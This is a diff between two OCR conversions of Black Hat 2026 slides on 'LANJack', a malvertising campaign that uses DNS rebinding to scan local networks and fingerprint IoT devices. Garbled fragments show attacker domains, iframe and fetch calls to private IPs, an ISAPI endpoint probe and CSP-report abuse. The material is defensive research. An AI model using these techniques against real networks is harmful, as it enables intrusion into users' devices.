@@ -8,19 +8,24 @@ year: 2026
 source_pdf: "BlackHat_USA_2026_Slides/Moriya Pedael_LANJack Turning Ads into IoT Recon Tools.pdf"
 pages: 56
 sha256: "dab9cd131880c61b7607d1355b4698ece7824f64627c63c0234d497c935321d0"
-text_chars: 18356
-ocr_pages: 28
+text_chars: 16226
+ocr_pages: 26
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 86.5
+ocr_unreliable_blocks: 3
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T23:13:46Z"
+converted_at: "2026-08-12T05:39:53Z"
 ---
 # LANJack Turning Ads into IoT Recon Tools
 
 **Speakers:** Moriya Pedael  
 **Conference:** Black Hat USA 2026  
 **Source:** `BlackHat_USA_2026_Slides/Moriya Pedael_LANJack Turning Ads into IoT Recon Tools.pdf` (56 pages)
+
 
 ## Slide 1
 
@@ -30,15 +35,11 @@ MORIYA PEDAEL
 
 1
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-LANJack |— ™
 Turning Ads into loT Recon Tools ii
-|
-Pe =
-black hat
-2026
 1
 @® MORIYA PEDAEL
 ```
@@ -53,15 +54,13 @@ AFTER
 
 2
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 About Me
 @ MORIYA PEDAEL
 BEFORE AFTER
-black hat
-€9536
-2026
 2
 ```
 
@@ -77,20 +76,16 @@ black hat
 
 3
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-7x CD
 About Me
 @ MORIYA PEDAEL
 ¢ 2016-2021 Graphic Designer
 ¢ 2020-2021 Web Developer :
-, e= =edge
 ¢ 2022-Current Security Researcher at Gg 7 Gg
 Add Integrity
-black hat
-€9335
-2026
 3
 ```
 
@@ -128,15 +123,14 @@ Ad Ecosystem PAST- DIRECT COMMUNICATION
 
 5
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Ad Ecosystem
 @ PAST- DIRECT COMMUNICATION
 Advertiser Publisher
-black hat
 @ys4
-2026
 5
 ```
 
@@ -149,20 +143,6 @@ Ad Ecosystem PRESENT- REAL TIME BIDDING
 #### **Publisher**
 
 7
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Ad Ecosystem
-@® PRESENT- REAL TIME BIDDING
-bel E
-Advertiser Publisher
-, t
-(=)> > w-w)
-black hat
-2026
-7
-```
 
 ## Slide 7
 
@@ -190,7 +170,8 @@ Ad Ecosystem PRESENT- REAL TIME BIDDING
 
 9
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Ad Ecosystem
@@ -211,8 +192,6 @@ Server engine results. These ads may make it more difficult for users to disting
 Botnet between actual search results and advertisements.'"! Purchased ads may also
 . target specific audiences using the advertising network's capabilities, potentiall
 further taking advantage of the trust inherently given to search engines and popular
-black hat
-2026
 ```
 
 ## Slide 9
@@ -221,11 +200,10 @@ black hat
 
 11
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-UnMcAfee | SiteAdvisor
-Maivertising vaio
 @ PRESENT —_—_——=s’[-
 Scanned 255149 files.
 Fast & Secure
@@ -234,7 +212,6 @@ Results Summary Enjoy apps on every device
 +1 Total security risks detected:
 [+] Total security risks resolved:
 Total security risks requiring attention:
-®©©eoO 86
 Threat Detected!
 Trojan Fakealert 256
 High Risk
@@ -243,8 +220,6 @@ Available Now!
 Have you received a Free Gift
 Box before?
 Yes
-black hat
-2026
 11
 ```
 
@@ -254,7 +229,8 @@ black hat
 
 12
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 DNS Rebinding _
@@ -264,16 +240,11 @@ DNS
 Attacker
 Server
 1.2.3.4
-rc
-[wut OO]
-(um OO)
-[umitt_OO)
 2) What IP of malicious.com ?
 Real Public IP + Short Time to Live
 Example: 1.2.3.4, TTL: 0
 4) http://malicious.com
 5] Malicious code
-black hat
 </> Get Resource 2026
 from'./index.html' </>
 TTL of malicious.com expired
@@ -283,15 +254,13 @@ TTL of malicious.com expired
 
 13
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Attacker Malicious
 Server DNS
 1.2.3.4
-[wut OO]
-[mutt OO]
-[uut_OO)
 Real Public IP + Short Time to Live
 Example: 1.2.3.4, TTL: 0
 <
@@ -306,7 +275,6 @@ TTL of malicious.com expired
 7) Private Local IP
 Example: 192.168.1.50
 <
-black hat
 20:
 ```
 
@@ -366,10 +334,10 @@ LANJack SPECIALITY
 
 18
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-LANJack
 @ DISCOVERY
 Cloaked Response: Ignored Users
 Name Domain
@@ -389,7 +357,6 @@ Name Met... Status Domain
 172.16.10.1
 192.168.14.1
 10.10.140.1 black hat
-2026
 4417 requests | OBtransferred 0B resources 18
 )
 )
@@ -410,10 +377,10 @@ Cloaked Response: Targeted Users
 
 19
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-LANJack
 @ DISCOVERY
 Cloaked Response: Ignored Users
 Name Domain
@@ -422,11 +389,8 @@ load.js?x=331857147-1772979237-501-1-1... 200 performance-metrics.net
 Cloaked Response: Targeted Users
 Url Method Status
 @ http: /811dab5c-8c8e-49ab-bb1c-f50ca9e017ad vf-globallab.com:83/CamScanner2.html?x... GET 403
-@ http://919fc57f-fbbb-4b7d-9a67-5a24ff07870" vf-globallab.com:€ 5/CamScanner2.html?x=... GET 403
 @ http://9e7df682-ede3-4451-a727-38bb26127ecd.vf-globallab.com:83/CamScanner2.html?x... GET 403
-(E) http://a0fOfd99-74a8-445b-9b0b-045acda6865b.vf-globallab.cor1:8000/>amScanner2.ht... GET 200
 0 http://a41ac988-2305-4e11-8cb3-eb6f4eadcb0a.vf-globallab.com:8010/CamScanner2.html... GET UNKN.
-(E) http://a56a298c-4a40-4203-9362-5cabd83a929b.vf-globallab.com'CamScannerz .html?x=.... GET 200
 Name Status v , Domain
 (=) k33p?x=79292830-1778513... 200 54.209.207.15
 [=] k33p?x=79292830-1778513... 200 54.209.207.15
@@ -444,20 +408,16 @@ Name Status v , Domain
 
 20
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-LANJack
 @ DISCOVERY
 performance-metrics.net: vf-globallab.com:
 “vf-globallab.com"
 3¢ Proximus
-hits: sbusinese bron e>VMC_Manual_9 EN | PDF
 Vodafone Mobile Connect IT Administrator's Guide
-/data.v£-globallab.com<,
-black hat
 @ys4
-2026
 20
 ```
 
@@ -473,30 +433,17 @@ https://burkina24.com/wp-content/uploads/2025/06/coca-1536x439.jpg
 
 21
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-LANJack
-@ DISCOVERY
-burkina24.com: Target:
-8 htips://burkina24.com/wp-content/uploads/2025/06/coca-1536x439.jpg
-black hat
-€9536
-2026
-21
-```
-
 ## Slide 20
 
 ## LANJack CAMPAIGN EVOLUTION
 
 22
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Jack
-LAN
 @ CAMPAIGN EVOLUTION
 May
 2025
@@ -504,7 +451,6 @@ November
 2025
 December May
 2025 2026
--
 LAN Recon
 Main Version
 RTSP Prob
@@ -513,9 +459,6 @@ One Month
 CSP Abuse Gesture Check
 Test Version Test Version
 One Week One Week
-black hat
-a=
-2026
 22
 ```
 
@@ -529,26 +472,20 @@ Forensic Evasion
 
 23
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-LANJack
 @ CAMPAIGN FLOW
-%
-ov
 Malicious
-AD
 > f
 a, Special:
 . DNS Cache Pollution &
 J Forensic Evasion
 Attack Triggering
 ————— DNS Cache Priming
-[ IFRAME: http://${uuldv4()}.vf-globallab.com:${port}/CamScanner.htm!
-FETCH: http://10.0.0.254/bla_iter1 jpg 7
 : credentials: ‘omit’ inaissance
 AbortSignal: 1 sec
-FETCH: http://192.168.1.//bla_iter1.jpg
 credentials: ‘omit’
 mode: ‘no-cors’
 cache: ‘no-store
@@ -559,10 +496,8 @@ http://10.0.0.253:8888/favicon.ico
 IMG: http://${int32_IP}.${uuldv4()}.control.vf-aloballab.com/.
 loT Fingerprinting &
 FETCH: /ISAPI/Security/userCheck Exploitation preparation
-Jupnpdevicedesc.xm!
 Ieeninoineathen black hat
 @ys4
-2026
 23
 ```
 
@@ -592,17 +527,12 @@ Ieeninoineathen black hat
 
 25
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Why Two Methods? = (7
-LANJack
 @ ATTACK TRIGGERING
-_ a es mmagenne
-sf
-black hat
-€9536
-2026
 25
 ```
 
@@ -662,7 +592,8 @@ LANJack DNS CACHE PRIMING
 
 30
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LANJack on
@@ -670,22 +601,15 @@ DNS Pinning
 Cache Priming
 Malicious
 Browser DNS
-[IT te‘e}
-(uit OO]
-(uimt_OO]
 DNS Cache Priming
 :{targeted_port}/CamScanner
 Taken from the cache
-2
 Rebinding Code
 Get root page
 {uuidv4}.vf-globallab.com
 TTL expired
 3) What IP of {uuidv4}.vf-globallab.com ?
 4) Private Local IP
-a
-black hat
-2026
 30
 ```
 
@@ -794,7 +718,8 @@ After
 
 38
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LANJack on
@@ -816,8 +741,6 @@ CamScanner IFrame
 a4 loT Finaerorintina &
 4) Private Local IP
 IMG: http://${int32_IP}.${uuldv4()}.control.vf-aloballab.com/...
-black hat
-2026
 38
 ```
 
@@ -846,7 +769,8 @@ After:
 
 40
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 60/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 LANJack ion
@@ -855,20 +779,12 @@ DNS Resolution swap to Internal IP:
 Before:
 Answers
 65d67bd3-33ff-48c3-a665 0d92e1927e.vf-aloballab.com A z addr 54
-Name: 85067bDd3-33fT a665-8c0d92e19 ». Vf -globallab
 Clas
 cache: ‘no-store
 AbortSignal: 3 sec Answers
-http://10.0.0.253:8888/favicon.ico
-Veeder , Be Adarand O77 uf al nhad Dob . , addin 409, 168,1, 105
 2 DNS Rebinding Name: 85d67b« 48c3-a665 -8c0d92e1927e. vf
-pera (nost wuoress) (i)
-IN (@x0001
 IMG: http://${int32_1P}.${uuldv4()}.control.vf-aloballab. con... Time to live 5 seconds)
-Pinta lemerth
 a4 loT Finaerorintina & Addre:
-black hat
-2026
 40
 ```
 
@@ -886,10 +802,10 @@ After
 
 41
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-LANJack
 cache: ‘no-store
 : AbortSignal: 3 sec
 http://10.0.0.253:8888/favicon.ico
@@ -914,8 +830,6 @@ Homey("CamScan: Stop Trying After " retryFrameCounter + " Attempts - " location.
 const json response. text().then((responseText) => {
 (responseText. indexOf ( 'funads3212' ) 1) {
 setTimeout(fetchFrame, 1 « 1000)
-black hat
-2026
 41
 ```
 
@@ -985,11 +899,11 @@ DNS Cache Pollution & Forensic Evasion
 
 47
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Jack
-LAN
 @ THIRD VARIANT
 May
 2025
@@ -1006,8 +920,6 @@ One Month
 CSP Abuse Gesture Check
 Test Version Test Version
 One Week One Week
-black hat
-a=
 47
 ```
 
@@ -1017,31 +929,21 @@ a=
 
 48
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-LANJack an
 @ THIRD VARIANT
 Attack Triggering
 i lFrame
 Controlled IFrame
 Ey CSP Abused
-<! htmt>
 >
 < >< charset="utf-8">< >/i.html</
 < >
-<))0>/1. html</) i>
-< sree" /f1?
-X=243737984~1766450064-333-3-22-719-11-eD 1Zb-711283b3-—e23d-3848-95c7-31010772a011-10031-529475-521950136
 carrier=izzix=" style="width: lpx;height: lpx;border:1px solid @eccc;" referrerpolicy="no-referrer"></ >
 f2?
-x=243737984-1766450064~-333-3-22-719-11-eD12b-711283b3-e23d-3848-95c7~310107720011-10031-529475-521950136
 carriereizzix style="width: Ipx;height:1px;border:1px solid M#@ccc;" referrerpolicy="no-referrer"></ >
-< src= /f3?
-x=243737984- L7csSeeet- 333-3-22-719-11-eD \Zb-711283b3-e23d-3848- Salus 31010772a011- a 529475- 321956136
-2026
-black hat
-€9335
 48
 ```
 
@@ -1051,16 +953,14 @@ black hat
 
 49
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-LANJack
 @ THIRD VARIANT
 Family Centre
 ilFrame
-black hat
 @ys4
-2026
 49
 ```
 
@@ -1070,18 +970,14 @@ black hat
 
 50
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-LANJack
 @ THIRD VARIANT
 Attack Triggering
 ilFrame
 Controlled IFrame
-3
-i
-black hat
-2526
 50
 ```
 
@@ -1091,17 +987,15 @@ black hat
 
 51
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 76/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-LANJack _
 @® THIRD VARIANT
 Name ¢ te Type nitiator
 r1?x=285180446-1766546665-651-1-79-190 adsrevenuestream.duckdn 33.2 158:443 text/htmi httesJ/adsrevenuestre
 =285180446-176 5 -6 Q 0 00 adsr nuestream.duckdn 158:443 text/html httos//adsre vestre
 vy Request Payload View source
-’ {csp-report: {
-y csp-report: {,..}
 blocked-uri: "https://myactivity.google.com"
 disposition: "enforce"
 document-uri: "https://adsrevenuestream.duckdns.org/f1?x=285180446-1766546665-651-1-79-1909-15-qxdEq—9e61d95 f-5da4—3dde-—a67b-19047 fa22c
@@ -1109,12 +1003,9 @@ effective-directiv "frame-src"
 line-number: 5
 original-policy: “default-src ‘self //accounts.google.com htt //*.gstatic.com https://ogs.google.com htt /\h3.google.com ht
 referrer: ""
-script—sample:
 source-file: "https://adsrevenuestream.duckdns.org
 status—code: 200
 violat directive: "“frame-src"
-black hat
-2026
 51
 ```
 
@@ -1124,14 +1015,13 @@ black hat
 
 52
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LANJack a
 @® THIRD VARIANT
 report-uri /r1?x=285180446-1766546665-
-black hat
-2026
 52
 ```
 
@@ -1141,7 +1031,8 @@ black hat
 
 53
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LANJack a
@@ -1149,8 +1040,6 @@ LANJack a
 v Response headers
 default-src ‘self’ https://accounts.google.com https://*.gstatic.com https://ogs.google.com htt
 analytics.com https://play.google.com https://accounts.youtube.com https://www.google.com;
-black hat
-2026
 53
 ```
 
@@ -1194,17 +1083,15 @@ FACEBOOK No Report Report
 
 57
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-LANJack
 @ THIRD VARIANT
 CONNECTED |NOT CONNECTED
 GOOGLE Report No Report
 FACEBOOK | No Report Report
-black hat
 @ys4
-2026
 57
 ```
 
